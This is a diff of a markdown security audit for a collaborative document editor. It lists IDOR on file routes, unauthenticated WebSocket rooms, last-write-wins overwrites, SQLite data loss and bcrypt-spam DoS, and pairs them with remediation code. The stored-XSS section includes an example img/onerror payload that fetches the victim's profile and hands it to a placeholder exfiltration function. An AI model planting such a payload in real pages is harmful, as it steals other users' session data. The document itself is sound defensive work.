@@ -1,61 +1,79 @@
-# Failure Cases & Security Audit: Nexus Collaborative Suite
+# System Failure Cases & Vulnerabilities: Nexus Collaborative Suite
 
-This document registers the critical failure cases, design vulnerabilities, and security flaws identified within the Nexus Workspace codebase before remediation.
-
----
-
-## 1. Authentication & Access Control (IDOR & WebSocket Bypasses)
-
-### Case 1: Insecure Direct Object References (IDOR) on REST API
-* **Vulnerability**: The server checks user authentication via the JWT token but **never validates authorization permissions** for file manipulation operations.
-* **Failure Scenarios**:
-  1. **Unauthorized Deletion**: Any logged-in user can delete any folder or file by sending a `DELETE /api/files/:id` or `DELETE /api/folders/:id` request containing the target ID.
-  2. **Unauthorized Edits**: Any logged-in user can modify the content and name of any document, sheet, or slide by sending a `PUT /api/files/:id` request.
-  3. **Unauthorized Reading**: Any logged-in user can query metadata, collaborator lists, comments, and action history for any file via `GET /api/files/:id`.
-
-### Case 2: Unauthenticated WebSockets Collaboration Rooms
-* **Vulnerability**: The Socket.io connection and room join handler (`join-room`) do not verify the collaborator's JWT token or check if the user is granted view/edit access.
-* **Failure Scenarios**:
-  * An anonymous user can connect via Socket.io and send simulated edit, cursor, selection, or drag events to any active workspace room, leading to page defacement or content disruption.
+This audit highlights the critical failure cases, design vulnerabilities, and architectural bottlenecks present in the current system. These issues range from severe authorization bypasses to concurrency conflicts in real-time collaboration.
 
 ---
 
-## 2. Concurrency & Data Synchronization Failures
+## 1. Critical Security Vulnerabilities (Authorization & Access Control)
 
-### Case 3: Last-Write-Wins (LWW) Collisions
-* **Vulnerability**: The backend does not run the Operational Transformation (OT) engine defined in `otEngine.js`. It performs a brute-force string/JSON replacement on the Prisma database entry.
-* **Failure Scenarios**:
-  * **Lost Edits**: If User A and User B edit the same paragraph at the same time, the server saves both full states in sequence. The latter update completely overwrites the former, wiping out one of the users' work entirely.
+### 🚨 Insecure Direct Object References (IDOR)
+* **Description**: Although the system features a `Permission` database model (assigning "owner", "editor", and "viewer" roles to files), the backend routes for viewing, updating, and deleting files do **not** check these permissions.
+* **Failure Cases**:
+  * **Unauthorized Deletion**: Any logged-in user can delete *any file* in the database by sending a `DELETE` request to `/api/files/:id` (if they know or guess the UUID).
+  * **Unauthorized Modification**: Any logged-in user can modify the content of any file by sending a `PUT` request to `/api/files/:id`.
+  * **Unauthorized Reading**: Any logged-in user can read the content and activity logs of any file via `GET /api/files/:id`.
+* **Remediation**: Check the `Permission` table in every file route before performing operations:
+  ```javascript
+  const userHasPermission = await prisma.permission.findFirst({
+    where: { fileId: req.params.id, userId: req.user.id }
+  });
+  if (!userHasPermission) return res.status(403).json({ error: "Access denied" });
+  ```
 
-### Case 4: Reconnection & Offline Resync Gaps
-* **Vulnerability**: The client does not sync state differences or lock editing when connection is lost.
-* **Failure Scenarios**:
-  * If a user loses connection, types offline, and reconnects, they push their outdated revision, overwriting all changes made by other online collaborators in the meantime.
+### 🚨 Unauthenticated WebSocket Connections
+* **Description**: The WebSocket handler accepts socket connections and room-joins without validating the user's JWT auth token.
+* **Failure Cases**:
+  * An anonymous user can connect via Socket.io, join the room of any `fileId`, listen to editing changes, cursor movements, and comments, or send fake edits to disrupt the document.
+* **Remediation**: Configure Socket.io middleware to verify the JWT token before allowing the connection to establish:
+  ```javascript
+  io.use((socket, next) => {
+    const token = socket.handshake.auth.token;
+    // Verify JWT token here
+  });
+  ```
 
 ---
 
-## 3. Database Persistence & Scaling Issues
+## 2. Concurrency & Synchronization Failures
 
-### Case 5: Ephemeral SQLite Disk on Cloud Container Restarts
-* **Vulnerability**: The application relies on a local SQLite file database (`dev.db`).
-* **Failure Scenarios**:
-  * Free containers (on Zeabur, Render, or Hugging Face Spaces) restart or sleep on inactivity. When they reboot, the local SQLite database file is reset to empty, resulting in the permanent loss of all user accounts, directories, and files.
+### 🚨 Concurrency Collision ("Last-Write-Wins" Overwrites)
+* **Description**: The real-time synchronization uses an operational-transformation (OT) engine simulator only on the client console. The server simply replaces the entire document content in the database using a **Last-Write-Wins (LWW)** strategy.
+* **Failure Cases**:
+  * **Lost Edits**: If User A and User B type simultaneously, User A's changes are sent to the server. Right after, User B's changes arrive. Because the server does not merge the changes, User A's work is completely overwritten by User B's entire page state.
+* **Remediation**: Implement a real-time CRDT library like **Yjs** or **Automerge** to merge operations on the server side instead of saving full string representations.
 
-### Case 6: Concurrent Database Write Locks
-* **Vulnerability**: SQLite locks the database file during write transactions.
-* **Failure Scenarios**:
-  * If multiple users are typing simultaneously, the frequent REST API `PUT` updates will clash, triggering `SQLITE_BUSY` errors and failing to save documents.
+### 🚨 Out-of-Order / Network Latency Race Conditions
+* **Description**: If a user experiences latency or temporary disconnection, they continue typing locally.
+* **Failure Cases**:
+  * When their connection recovers, the client sends their stale local revision to the server, overwriting any edits made by other users in the meantime.
 
 ---
 
-## 4. Input Validation & Denial of Service Vulnerabilities
+## 3. Database & Infrastructure Limitations
 
-### Case 7: Stored Cross-Site Scripting (XSS)
-* **Vulnerability**: The rich text editor (TipTap) saves content as raw HTML strings, which are rendered raw on the client without sanitization.
-* **Failure Scenarios**:
-  * A user inserts a malicious script inside a shared document. When another user opens the document, the script runs in their session, potentially hijacking their authentication token.
+### 🚨 Ephemeral SQLite Datastore
+* **Description**: The application uses a local SQLite file (`dev.db`).
+* **Failure Cases**:
+  * **Data Loss on Restart**: In serverless or ephemeral container deployments (like Vercel, free Render, or Hugging Face Spaces), the filesystem is wiped out whenever the container spins down or restarts. All registered users, documents, folders, and comments will be permanently deleted.
+* **Remediation**: Migrate the Prisma datasource from SQLite to a cloud PostgreSQL database (e.g. Neon, Supabase).
 
-### Case 8: CPU Exhaustion / Denial of Service (DoS) via Bcrypt Spam
-* **Vulnerability**: The server does not rate limit authentication routes.
-* **Failure Scenarios**:
-  * An attacker can spam thousands of registration or login requests. Running the CPU-heavy `bcrypt.compare` and `bcrypt.hash` functions repeatedly will saturate CPU cores, causing a Denial of Service.
+### 🚨 SQLite Write Locks
+* **Description**: SQLite locks the database file during write transactions.
+* **Failure Cases**:
+  * Under load (e.g., 5+ users typing simultaneously, sending debounced updates every second), the database will throw `SQLITE_BUSY: database is locked` exceptions, causing API write requests to fail.
+
+---
+
+## 4. Input Validation & Resilience Vulnerabilities
+
+### 🚨 Lack of HTML Sanitization (Cross-Site Scripting - XSS)
+* **Description**: The document editor (TipTap) saves content as raw HTML strings, which the backend saves and serves blindly without sanitization.
+* **Failure Cases**:
+  * A malicious collaborator can insert an XSS script payload (e.g., `<img src=x onerror="fetch('/api/auth/profile').then(r=>r.json()).then(d=>sendToAttacker(d))">`) inside a document. When another user opens the document, the script runs in their browser and steals their session tokens.
+* **Remediation**: Use `dompurify` or `sanitize-html` on the server before saving or on the client before rendering HTML.
+
+### 🚨 Denial of Service (DoS) via Bcrypt Spamming
+* **Description**: The backend does not implement rate limiting.
+* **Failure Cases**:
+  * An attacker can spam the `/api/auth/login` or `/api/auth/register` endpoints with requests. Since `bcrypt` hashing is intentionally CPU-intensive, this will saturate the server's CPU and make the site unresponsive for all users.
+* **Remediation**: Implement rate-limiting middleware (like `express-rate-limit`).
